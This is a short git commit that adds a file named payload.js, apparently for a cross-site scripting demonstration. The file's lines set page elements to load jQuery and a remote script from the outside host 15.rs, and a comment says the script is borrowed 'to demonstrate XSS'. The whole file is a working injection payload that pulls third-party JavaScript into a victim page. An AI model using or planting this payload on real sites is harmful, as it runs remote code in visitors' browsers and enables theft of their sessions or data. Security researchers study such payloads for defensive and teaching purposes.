e2cebb6ce336d2ba65930c805357a4b85a5c69c1
Data <40370115+TikvahTerminator@users.noreply.github.com>
2020-02-03 16:19:01 +0000

    Add files via upload

---
+++ payload.js
@@ -0,0 +1,3 @@
+document.getElementById("jq").setAttribute("src","https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js");
+document.getElementById("fif").setAttribute("src","https://15.rs/1.js");
+/*15.rs is by Matt Evans.  I do not claim to own this, i'm simply borrowing it to demonstrate XSS */
